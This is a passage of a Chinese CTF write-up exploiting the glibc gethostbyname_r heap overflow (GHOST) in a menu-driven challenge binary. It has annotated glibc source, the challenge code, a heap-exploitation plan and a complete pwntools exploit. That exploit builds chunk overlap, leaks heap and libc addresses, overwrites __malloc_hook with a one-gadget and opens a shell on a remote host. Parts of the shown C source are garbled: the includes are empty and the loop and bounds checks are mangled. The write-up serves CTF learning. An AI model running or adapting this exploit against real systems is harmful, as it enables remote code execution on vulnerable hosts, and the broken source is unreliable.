                        }
                        //转换出错
                        if (!ok)
                        {
                            *h_errnop = HOST_NOT_FOUND;
                            if (buffer_size)
                                *result = NULL;
                            goto done;
                        }
                        //直接把name复制到hostname中, 用hostname作为结果中的h_name
                        //strcpy从*buffer+0x28开始写入strlen(name)+1, 产生溢出
                        resbuf->h_name = strcpy(hostname, name);
                        //没有别名
                        h_alias_ptr[0] = NULL;
                        resbuf->h_aliases = h_alias_ptr;
                        //h_addr_list只有一个
                        (*h_addr_ptrs)[0] = (char *)host_addr; //地址也是一样的
                        (*h_addr_ptrs)[1] = NULL;
                        resbuf->h_addr_list = *h_addr_ptrs;
                        //设置长度与IP地址类型
                        if (af == AF_INET && (_res.options & RES_USE_INET6))
                        {
                            //...
                        }
                        else
                        {
                            resbuf->h_addrtype = af;
                            resbuf->h_length = addr_size;
                        }
                        //返回的状态
                        //...
                        //结束
                        goto done;
                    }
                    if (!isdigit(*cp) && *cp != '.') //既不是字母，又不是. 那么就不是合法的IPv4，退出
                        break;
                }
            }
            if ((isxdigit(name[0]) && strchr(name, ':') != NULL) || name[0] == ':') //IPv6: 开始是hex字符并且包含':'. 或者包含分号
            {
                //...
            }
        }
        return 0;
    done:
        return 1;
    }
  * 判断IP地址的方法很简陋
  * 在生成hostent结构体时出了问题没有计算h_alias_ptr
图示：
  * 因此把hostname复制过去，在这里产生了溢出8B
  * 函数的数据结构:
## 题目解析
###  题目源码
    //gcc pwn.c -g -o pwn
    #include 
    #include 
    #include 
    #include 
    #define MAX 16
    struct hostent* HostArr[MAX];
    char* BufferArr[MAX];
    char* NameArr[MAX];
    int Menu(void)
    {
        puts("1.InputName");
        puts("2.ShowHost");
        puts("3.Delete");
        puts("4.Exit");
        printf(">>");
        int cmd;
        scanf("%d", &cmd);
        return cmd;
    }
    void InputName(void)
    {
        //read idx
        int idx;
        printf("idx:");
        scanf("%d", &idx);
        if(idx=MAX)
            exit(0);
        //alloc name buf
        int len;
        printf("len:");
        scanf("%d", &len);
        NameArr[idx] = malloc(len+1);
        if(NameArr[idx]==NULL)
            exit(0);
        //read name
        int i;
        for(i=0; i=MAX)
            exit(0);
        struct hostent* host = HostArr[idx];
        //host name
        if(host->h_name!=NULL)
            printf("%s\n", host->h_name);
        //IP
        if(host->h_addr_list!=NULL)
               for(int i=0; host->h_addr_list[i]!=NULL; i++){
                char* ip = host->h_addr_list[i];
                printf("%s\n", ip);
            }
    }
    void Delete(void)
    {
        //read idx
        int idx;
        printf("idx:");
        scanf("%d", &idx);
        if(idx=MAX)
            exit(0);
        free(NameArr[idx]);
        NameArr[idx]=NULL;
        free(BufferArr[idx]);
        BufferArr[idx]=NULL;
        free(HostArr[idx]);
        HostArr[idx]=NULL;
    }
    int main(int argc, char** argv)
    {
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);
        int cmd=0;
        while(1)
        {
            cmd = Menu();
            if(cmd==1)
                InputName();
            else if(cmd==2)
                ShowHost();
            else if(cmd==3)
                Delete();
            else
                break;
        }
        return 0;
    }
  * 编译时保护全开
  * patchelf让编译出的文件使用2.17的libc 
        patchelf --set-interpreter `pwd`/ld.so.2 --set-rpath `pwd` ./pwn
## 思路
  * 构造chunk重叠 
    * 覆盖size的目的是构造chunk重叠, 这样才能控制堆上的各种指针
    * __nss_hostname_digits_dots向buffer写入时要求只能是.和十进制字符, 实测发现只写入0是最稳定可以溢出的
    * hostent的size本来就是0x30, 只覆盖为一个’0’也还是0x30, 因此覆盖两个0, 让chunksize变成0x3030
  * 自此又产生了三种思路, 
    * 如果覆盖为0x3031, 在chunk后面放0x21的在使用chunk, 直接得到一个非常大的UBchunk
    * 使用top chunk作为后一个chunk, 从而与top合并
    * 如果覆盖为0x3030, 那么可以通过P=0向前合并
  * free时的检查
  * check_in_chunk()检查最少的就是后一个chunkP=1, 并且不是top chunk的情况,
  * 因此溢出Bufer的size为0x3031之后, 只需要再Buffer chunk+0x3030处伪造放上一个flat(0, 0x21, 0, 0)的chunk就可得到一个很大的UBchunk
  * __nss_hostname_digits_dots在写入时对于name限制很多, 因此我们只用他去溢出size, 读入name的过程对字符限制很少, 因此总体思路为 
    * 利用gethostbyname_r()溢出size
    * 利用read(0, name, ..)进行写入任意数据
###  泄露地址
  * Show时会通过hostent结构体中得到指针进行输出, 因此我们打出chunk 重叠之后, 有两个思路 
    * 利用00写入覆盖hostent.h_name指针的最低字节, 使其指向某个指针, 然后泄露地址
    * 直接Bin机制在hostent中写入指针, 然后写入地址
  * 第二种更具有普适性, 不需要细致的调整, 因此选择第二个思路: 
    * 假如有N0 | B0|H0 | N1 | B1 | H1
    * 利用__nss_hostname_digits_dots()在写入B0时溢出0的chunk size为0x3031
    * 然后通过布局在H0+0x3030的位置放上flat(0, 0x21, 0, 0)伪造H0的nextchunk  
f – ree(H0)即可打出chunk 重叠, 此时UB(B0, H0, N1, B1, H1)
    * 然后通过切割UB, 使得UB的fd bk指针写入到H1内部, 如下图
    * 然后show(3)即可泄露地址
###  getshell
  * 有了地址之后getshell就很容易了 
    * 再N1 B1 H1后面通过布局0x70的chunk, 然后free掉, 进入Fastbin[0x70]
    * 然后继续切割chunk, 修改fastbin chunk的fd为__malloc_hook-0x23, 利用0x7F伪造size
    * 然后修改__malloc_hook为OGG
###  EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    from random import randint
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    elf_path = "./pwn"
    elf = ELF(elf_path)
    libc = ELF('libc.so.6')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    if(len(sys.argv)==1):            #local
        cmd = [elf_path]
        sh = process(cmd)
        #proc_base = sh.libs()['/home/parallels/pwn']
    else:                            #remtoe
        sh = remote('118.190.62.234', 12435)
    def Num(n):
        sh.sendline(str(n))
    def Cmd(n):
        sh.recvuntil('>>')
        Num(n)
    def Name(idx, name):
        Cmd(1)
        sh.recvuntil('idx:')
        Num(idx)
        sh.recvuntil('len:')
        Num(len(name))
        sh.sendline(name)
    def Show(idx):
        Cmd(2)
        sh.recvuntil('idx:')
        Num(idx)
    def Delete(idx):
        Cmd(3)
        sh.recvuntil('idx:')
        Num(idx)
    #chunk overlap
    Name(0, '0'*0x2F)
    Name(1, '0'*0x40+'10')
    Name(2, '0'*0x5F)
    Name(3, '0'*0x1F)
    Delete(3)
    Name(3, '0'*0x1F)        #switch Name and Host
    Name(10, '0'*0x5F)
    Name(11, '0'*0x5F)
    Name(12, '0'*0x5F)
    Name(13, '0'*0x5F)
    exp = '0'*0x2950
    exp+= flat(0, 0x21, 0, 0)    #B0's next chunk
    Name(5, exp)
    Delete(1)                #UB(H0, 0x3030)
    #leak addr
    exp = '0'.ljust(0x7F, '\x00')
    Name(6, exp)            #split UB chunk, H3's h_addr_list=UB's bk
    Show(3)
    sh.recvuntil('0'*0x1F+'\n\n')
    heap_addr = u64(sh.recv(6).ljust(8, '\x00'))-0x358
    Log('heap_addr')
    sh.recv(17)
    libc.address = u64(sh.recv(6).ljust(8, '\x00'))-0x3c17a8
    Log('libc.address')
    #fastbin Attack
    Delete(10)
    exp = '0'*0x4F
    Name(7, exp)
    exp = '0'*0x10
    exp+= flat(0, 0x71, libc.symbols['__malloc_hook']-0x23)
    exp = exp.ljust(0xBF, '0')
    Name(7, exp)
    Name(8, '0'*0x5F)
    exp = '0'*0x13
    exp+= p64(libc.address+0x462b8)
    Name(8, exp.ljust(0x5F, '0'))
    #gdb.attach(sh, '''
    #heap bins
    #telescope 0x202040+0x0000555555554000 48
    #break malloc
    #''')
    sh.interactive()
    '''
    NameArr            telescope 0x202040+0x0000555555554000
    HostArr            telescope 0x2020C0+0x0000555555554000
    BufferArr        telescope 0x2022C0+0x0000555555554000 
    0x46262 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rax == NULL
    0x462b8 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL
    0xe66b5 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    '''